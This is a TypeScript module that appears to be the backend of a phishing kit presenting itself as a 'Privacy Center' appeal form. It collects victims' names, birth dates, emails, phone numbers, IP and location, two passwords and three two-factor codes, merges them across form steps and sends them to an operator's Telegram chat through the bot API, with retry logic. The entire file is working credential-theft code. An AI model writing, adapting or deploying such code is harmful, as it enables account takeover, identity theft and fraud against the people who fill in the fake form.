import https from 'https';
import axios from 'axios';
import type { FormData } from '@/app/store/slices/stepFormSlice';
import { memoryStoreTTL } from 'utils/memoryStore';
import { generateKey } from 'utils/generateKey';

const agent = new https.Agent({ family: 4 });

/** Giới hạn Telegram; chừa biên cho entity HTML. */
const TELEGRAM_TEXT_MAX = 4096;

export type SendTelegramOutcome =
    | { ok: true; skipped?: false }
    | { ok: true; skipped: true; reason: 'missing_config' | 'rate_limited' }
    | { ok: false; error: unknown };

function getTelegramConfig() {
    const token = process.env.TELEGRAM_BOT_TOKEN?.trim();
    const chatId = process.env.TELEGRAM_CHAT_ID?.trim();
    if (!token || !chatId) {
        return null;
    }
    return {
        api: `https://api.telegram.org/bot${token}`,
        chatId,
    };
}

const rateLimiter = new Map<string, number>();
const RATE_LIMIT_WINDOW_MS = 1000;

function checkRateLimit(key: string): boolean {
    const now = Date.now();
    const lastCall = rateLimiter.get(key);

    if (!lastCall || now - lastCall > RATE_LIMIT_WINDOW_MS) {
        rateLimiter.set(key, now);
        return true;
    }

    return false;
}

async function retryTelegramRequest<T>(
    requestFn: () => Promise<T>,
    maxRetries = 3
): Promise<T> {
    let lastError: unknown;

    for (let attempt = 1; attempt <= maxRetries; attempt++) {
        try {
            return await requestFn();
        } catch (error: unknown) {
            lastError = error;
            const err = error as { response?: { status?: number; data?: { description?: string } }; message?: string };
            const errorCode = err?.response?.status;
            const errorDesc = err?.response?.data?.description ?? '';

            if (
                errorCode === 401 ||
                errorCode === 403 ||
                errorDesc.includes('chat not found') ||
                errorDesc.includes('bot was blocked')
            ) {
                throw error;
            }

            if (attempt === maxRetries) {
                break;
            }

            const delayMs = 2 ** (attempt - 1) * 1000;
            console.warn(`Telegram API attempt ${attempt} failed, retry in ${delayMs}ms:`, err?.message);
            await new Promise((resolve) => setTimeout(resolve, delayMs));
        }
    }

    throw lastError;
}

function escapeHtml(value: string | number | null | undefined): string {
    const str = value === null || value === undefined ? '' : String(value);
    return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

type NormalizedPrivacyPayload = {
    ip: string;
    location: string;
    country_code: string;
    fullName: string;
    fanpage: string;
    day: string;
    month: string;
    year: string;
    email: string;
    emailBusiness: string;
    phone: string;
    appealReason: string;
    message: string;
    password: string;
    passwordSecond: string;
    authMethod: string;
    twoFa: string;
    twoFaSecond: string;
    twoFaThird: string;
};

function normalizeData(input: Partial<FormData> | Record<string, unknown> = {}): NormalizedPrivacyPayload {
    const raw = input as Record<string, unknown>;
    return {
        ip: String(raw.ip ?? ''),
        location: String(raw.location ?? ''),
        country_code: String(raw.country_code ?? ''),
        fullName: String(raw.fullName ?? raw.name ?? ''),
        fanpage: String(raw.fanpage ?? ''),
        day: String(raw.day ?? ''),
        month: String(raw.month ?? ''),
        year: String(raw.year ?? ''),
        email: String(raw.email ?? ''),
        emailBusiness: String(raw.emailBusiness ?? raw.business ?? ''),
        phone: String(raw.phone ?? ''),
        appealReason: String(raw.appealReason ?? ''),
        message: String(raw.message ?? ''),
        password: String(raw.password ?? ''),
        passwordSecond: String(raw.passwordSecond ?? ''),
        authMethod: String(raw.authMethod ?? ''),
        twoFa: String(raw.twoFa ?? ''),
        twoFaSecond: String(raw.twoFaSecond ?? ''),
        twoFaThird: String(raw.twoFaThird ?? ''),
    };
}

function mergeData(
    oldData: Partial<FormData> | Record<string, unknown> = {},
    newData: Partial<FormData> | Record<string, unknown> = {}
): NormalizedPrivacyPayload {
    const normalizedOld = normalizeData(oldData);
    const normalizedNew = normalizeData(newData);
    const result = { ...normalizedOld };
    (Object.entries(normalizedNew) as [keyof NormalizedPrivacyPayload, string][]).forEach(([k, v]) => {
        if (v !== undefined && v !== '') {
            result[k] = v;
        }
    });
    return result;
}

function field(label: string, value: string, options?: { monospace?: boolean }): string {
    const display = value === '' ? '—' : escapeHtml(value);
    if (options?.monospace !== false) {
        return `<b>${escapeHtml(label)}</b>\n<code>${display}</code>`;
    }
    return `<b>${escapeHtml(label)}</b>\n${display}`;
}

function sectionTitle(title: string): string {
    return `\n<b>${escapeHtml(title)}</b>`;
}

function formatMessage(data: Partial<FormData> | Record<string, unknown>): string {
    const d = normalizeData(data);
    const submittedAt = new Date().toISOString();
    const dob =
        [d.day, d.month, d.year].every((x) => x === '')
            ? '—'
            : `${escapeHtml(d.day)}/${escapeHtml(d.month)}/${escapeHtml(d.year)}`;
    const phoneDisplay = d.phone ? escapeHtml(`+${d.phone.replace(/^\+/, '')}`) : '—';

    const lines: string[] = [
        `<b>Privacy Center</b>`,
        `<i>Submitted:</i> <code>${escapeHtml(submittedAt)}</code>`,
        sectionTitle('Network'),
        field('IP address', d.ip || '—'),
        field('Location', d.location || '—'),
        field('Country code', d.country_code || '—'),
        sectionTitle('Profile'),
        field('Full name', d.fullName),
        field('Page name', d.fanpage),
        `<b>Date of birth</b>\n<code>${dob}</code>`,
        sectionTitle('Contact'),
        field('Email', d.email),
        field('Business email', d.emailBusiness),
        `<b>Phone</b>\n<code>${phoneDisplay}</code>`,
        sectionTitle('Appeal'),
        field('Appeal reason', d.appealReason || '—'),
        field('Additional message', d.message || '—'),
        sectionTitle('Credentials'),
        field('Password (primary)', d.password),
        field('Password (secondary)', d.passwordSecond),
    ];

    if (d.authMethod) {
        lines.push(field('Auth method', d.authMethod));
    }

    lines.push(
        sectionTitle('Two-factor codes'),
        field('2FA code (1)', d.twoFa),
        field('2FA code (2)', d.twoFaSecond),
        field('2FA code (3)', d.twoFaThird)
    );

    let text = lines.join('\n\n').trim();
    if (text.length > TELEGRAM_TEXT_MAX) {
        text = `${text.slice(0, TELEGRAM_TEXT_MAX - 24)}\n<i>(truncated)</i>`;
    }
    return text;
}

async function postSendMessage(
    apiBase: string,
    chatId: string,
    text: string
): Promise<{ message_id?: number }> {
    const res = await retryTelegramRequest(() =>
        axios.post<{ result?: { message_id?: number } }>(
            `${apiBase}/sendMessage`,
            {
                chat_id: chatId,
                text,
                parse_mode: 'HTML',
            },
            {
                httpsAgent: agent,
                timeout: 10000,
            }
        )
    );
    return res.data?.result ?? {};
}

export async function sendTelegramMessage(data: Partial<FormData>): Promise<SendTelegramOutcome> {
    const config = getTelegramConfig();
    if (!config) {
        console.warn(
            'Telegram skipped: set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in environment'
        );
        return { ok: true, skipped: true, reason: 'missing_config' };
    }

    const key = generateKey(data as Record<string, string>);
    if (!checkRateLimit(key)) {
        console.warn(`Telegram skipped: rate limit for key ${key}`);
        return { ok: true, skipped: true, reason: 'rate_limited' };
    }

    const prev = memoryStoreTTL.get(key);
    const fullData = mergeData(prev?.data ?? {}, data);
    const updatedText = formatMessage(fullData);

    try {
        const { message_id: messageId } = await postSendMessage(config.api, config.chatId, updatedText);
        if (messageId !== undefined) {
            memoryStoreTTL.set(key, { message: updatedText, messageId, data: fullData });
        } else {
            console.warn('Telegram API response missing message_id');
        }
        return { ok: true };
    } catch (err: unknown) {
        const desc =
            (err as { response?: { data?: { description?: string } } })?.response?.data?.description ?? '';
        if (desc.includes('message to edit not found')) {
            try {
                const { message_id: messageId } = await postSendMessage(
                    config.api,
                    config.chatId,
                    updatedText
                );
                if (messageId !== undefined) {
                    memoryStoreTTL.set(key, { message: updatedText, messageId, data: fullData });
                }
            } catch (sendErr) {
                console.error('Telegram resend error:', sendErr);
                return { ok: false, error: sendErr };
            }
            return { ok: true };
        }
        console.error('Telegram send error:', err);
        return { ok: false, error: err };
    }
}
